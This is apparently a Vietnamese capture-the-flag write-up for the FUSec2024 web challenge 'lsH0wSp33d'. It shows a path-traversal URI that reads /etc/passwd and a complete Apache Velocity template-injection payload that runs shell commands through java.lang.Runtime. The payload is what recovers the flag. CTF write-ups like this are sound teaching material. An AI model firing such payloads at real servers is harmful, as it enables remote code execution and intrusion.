# lsH0wSp33d

Bởi vì team mình là team có 3 người chơi forensics và 1 người chơi crypto. Vậy nên, bọn mình chỉ có thể solve được 1 bài web duy nhất

![image](https://github.com/anhshidou/FUSec2024/assets/120787381/cd6bebfd-8409-48ef-bc99-a17d3e5520b9)

Ở đây, ta thử scan web xem có cái gì không. Sau khi scan ra, mình thấy 1 uri đáng ngờ là ``` /\..\..\..\..\..\..\..\..\..\etc\passwd ```

![image](https://github.com/anhshidou/FUSec2024/assets/120787381/523df1d6-6667-4f46-9e74-1f619aded8a4)

Sau khi paste vào url thì mình thấy giao diện web không còn gì cả, không còn màu mè hoa lá

![image](https://github.com/anhshidou/FUSec2024/assets/120787381/289d0c5b-5abb-461b-bebe-d3e3e86ebe1e)

Sau đó, mình thử bấm enter để search thì nó xuất hiện một dòng có vẻ như là vuln của web này ? Vì mình không học web mà chỉ là rẽ ngang nên không rõ lắm

![image](https://github.com/anhshidou/FUSec2024/assets/120787381/11dfde2e-afea-4c66-affd-3c9645ad6e09)

Sau khi qua tìm hiểu, mình thấy rằng velocity là 1 Java-based Template. Vì thế nên, có thể sẽ có đoạn payload nào đó để inject vào trong cái bài này. Mình google thử velocity payload shell script thì ra được đoạn payload là:

``` #set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output ```

src: https://github.com/epinna/tplmap/issues/9

Lúc này, ta thử paste đoạn payload kia vào trong ô search keywords và ra được kết quả

![image](https://github.com/anhshidou/FUSec2024/assets/120787381/eb95dc5e-0ff5-4370-a332-6f5455a559ef)

Flag: FUSec{v3l0c1ty_SSTI_1s_34sy_4s_h3ll}








